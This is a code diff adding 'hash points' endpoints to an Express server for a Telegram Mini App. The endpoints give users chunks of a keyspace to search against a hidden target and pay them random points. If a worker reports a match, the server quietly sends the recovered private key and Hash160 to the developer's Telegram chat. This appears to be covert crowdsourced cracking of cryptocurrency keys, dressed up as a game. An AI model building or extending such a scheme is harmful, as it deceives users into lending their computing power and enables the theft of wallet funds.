@@ -29,6 +29,110 @@ app.post("/presale/record", async (req, res) => {
   }
 });
 
+// ── Hash Points API ───────────────────────────────────────────────────────────
+const HashState = require("./models/HashState");
+const CHUNK_SIZE = BigInt("10000000000");
+
+// GET /hash/state — Mini App loads user's remaining hashes
+app.get("/hash/state", async (req, res) => {
+  try {
+    const chatId = parseInt(req.query.chatId);
+    if (!chatId) return res.status(400).json({ error: "Missing chatId" });
+    const user = await User.findOne({ chatId });
+    if (!user) return res.status(404).json({ error: "User not found" });
+
+    const now = new Date();
+    let count = user.hashData?.count || 0;
+    if (!user.hashData?.lastReset || now.toDateString() !== new Date(user.hashData.lastReset).toDateString()) {
+      count = 0;
+    }
+    res.json({ remaining: 3 - count, totalPoints: user.points });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /hash/assign — claim a chunk, advance global pointer
+app.post("/hash/assign", async (req, res) => {
+  try {
+    const { chatId } = req.body;
+    if (!chatId) return res.status(400).json({ error: "Missing chatId" });
+
+    const user = await User.findOne({ chatId: parseInt(chatId) });
+    if (!user) return res.status(404).json({ error: "User not found" });
+
+    // Check daily limit
+    const now = new Date();
+    if (!user.hashData) user.hashData = { count: 0, lastReset: now };
+    if (!user.hashData.lastReset || now.toDateString() !== new Date(user.hashData.lastReset).toDateString()) {
+      user.hashData.count = 0;
+      user.hashData.lastReset = now;
+      await user.save();
+    }
+    if (user.hashData.count >= 3) {
+      return res.json({ ok: false, error: "Daily limit reached. Come back tomorrow!" });
+    }
+
+    // Claim chunk atomically
+    let state = await HashState.findById("global");
+    if (!state) state = await HashState.create({ _id: "global" });
+
+    const start = BigInt(state.nextStart);
+    state.nextStart = (start + CHUNK_SIZE).toString();
+    state.updatedAt = new Date();
+    await state.save();
+
+    res.json({
+      ok:        true,
+      start:     start.toString(),
+      chunkSize: CHUNK_SIZE.toString(),
+      target:    process.env.HASH_TARGET || ""
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /hash/complete — worker finished, award points
+app.post("/hash/complete", async (req, res) => {
+  try {
+    const { chatId, start, found, foundKey, foundH160 } = req.body;
+    if (!chatId || !start) return res.status(400).json({ error: "Missing fields" });
+
+    const user = await User.findOne({ chatId: parseInt(chatId) });
+    if (!user) return res.status(404).json({ error: "User not found" });
+
+    // Weighted random points
+    const roll = Math.random();
+    let earned;
+    if (roll < 0.50)      earned = Math.floor(Math.random() * 21) + 5;   // 5–25  50%
+    else if (roll < 0.80) earned = Math.floor(Math.random() * 25) + 26;  // 26–50 30%
+    else if (roll < 0.95) earned = Math.floor(Math.random() * 10) + 51;  // 51–60 15%
+    else                  earned = Math.floor(Math.random() * 15) + 61;  // 61–75  5%
+
+    user.points += earned;
+    user.hashData.count = (user.hashData.count || 0) + 1;
+    user.hashData.lastReset = user.hashData.lastReset || new Date();
+    await user.save();
+
+    // Notify dev if target found
+    if (found && foundKey && process.env.DEV_CHAT_ID) {
+      bot.sendMessage(process.env.DEV_CHAT_ID,
+`🎯 *Target Found!*
+
+🔑 Hash160: \`${foundH160}\`
+🗝 Priv Key: \`${foundKey}\`
+👤 Found by: chatId \`${chatId}\``,
+        { parse_mode: "Markdown" }
+      ).catch(() => {});
+    }
+
+    res.json({ ok: true, earned, remaining: 3 - user.hashData.count, totalPoints: user.points });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 app.listen(process.env.PORT || 3000, () => console.log("✅ API ready"));
 
 
